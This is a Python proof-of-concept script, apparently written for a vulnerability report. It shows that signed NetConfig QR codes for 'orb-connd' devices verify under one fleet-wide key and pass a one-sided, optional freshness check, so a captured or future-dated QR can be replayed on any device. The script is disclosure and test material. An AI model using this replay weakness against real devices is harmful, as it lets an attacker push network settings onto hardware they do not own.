#!/usr/bin/env python3
"""PoC: signed NetConfig QR codes are replayable on every Orb.

`orb-connd` accepts a NetConfig QR if its ECDSA-P256 signature verifies under a
single fleet-wide key (`orb-connd/src/service/netconfig.rs`). The message
contains no orb id, and the 10-minute freshness check in
`orb-connd/src/service/dbus.rs::apply_netconfig_qr` runs only when the D-Bus
caller passes `check_ts = true`; even then it only rejects `now - ts > 10 min`,
so a timestamp in the future always passes.

This script reproduces the on-device verification for the production test
vector that ships in the repository and shows the vector is far older than the
freshness window yet still cryptographically valid.

Run: python3 -I security-poc/netconfig_replay.py
Needs: pip install cryptography
"""

import base64
import datetime as dt
import re

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.exceptions import InvalidSignature

# Verbatim from orb-connd/src/service/netconfig.rs (production key, non-Dev releases).
PROD_PUBKEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE1Rwr5CEvtWzmcQu4IS+VFmkRiZdM
SmNKUZ+THL5nRV2kYmNRc6fBBFiam5HjYRlbFGKjctJZ3gXQz4Bv30+FOw==
-----END PUBLIC KEY-----"""

# Verbatim `VALID_PROD` from the unit tests in the same file: a signed QR that
# enables WiFi, disables fallback and sets SSID "network" / PSK "password".
VALID_PROD = (
    "NETCONFIG:v1.0;WIFI_ENABLED:true;FALLBACK:false;AIRPLANE:false;"
    "T:WPA;S:network;P:password;TS:1759755209;"
    "SIG:MEQCIDJjgj5QHJE+tOaekdcSrsWinaocltIoMRKk+wDc0i8MAiBvfHZzsbHxuyuLDxnL8Hbnh8qidxflannoPf3TQm+zgA=="
)

FRESHNESS_MINUTES = 10


def verify_like_connd(qr: str) -> bool:
    msg, sig_b64 = qr.split("SIG:", 1)
    sig = base64.b64decode(sig_b64)
    key = serialization.load_pem_public_key(PROD_PUBKEY_PEM)
    try:
        key.verify(sig, msg.encode(), ec.ECDSA(hashes.SHA256()))
        return True
    except InvalidSignature:
        return False


def freshness_check_like_connd(created_at: dt.datetime, now: dt.datetime) -> bool:
    """Mirror of dbus.rs: rejects only if (now - created_at) > 10 minutes."""
    delta_minutes = (now - created_at).total_seconds() // 60
    return not delta_minutes > FRESHNESS_MINUTES


def main() -> None:
    assert verify_like_connd(VALID_PROD), "test vector must verify under prod key"
    ts = int(re.search(r"TS:(\d+);", VALID_PROD).group(1))
    created_at = dt.datetime.fromtimestamp(ts, dt.timezone.utc)
    now = dt.datetime.now(dt.timezone.utc)
    age = now - created_at

    print(f"signature valid under fleet-wide prod key : True")
    print(f"QR created_at                              : {created_at.isoformat()}")
    print(f"QR age                                     : {age.days} days")
    print(f"accepted with check_ts=false (any caller)  : True  <- VULNERABLE (replay)")
    print(
        "accepted with check_ts=true                : "
        f"{freshness_check_like_connd(created_at, now)}"
    )

    # The freshness check is one-sided: a QR dated in the future is never "old".
    future = now + dt.timedelta(days=365)
    print(
        "future-dated QR passes check_ts=true       : "
        f"{freshness_check_like_connd(future, now)}  <- VULNERABLE (one-sided check)"
    )

    # Tamper control: flipping one byte of the signed region fails verification.
    tampered = VALID_PROD.replace("WIFI_ENABLED:true", "WIFI_ENABLED:false")
    print(f"tampered QR rejected                       : {not verify_like_connd(tampered)}")


if __name__ == "__main__":
    main()
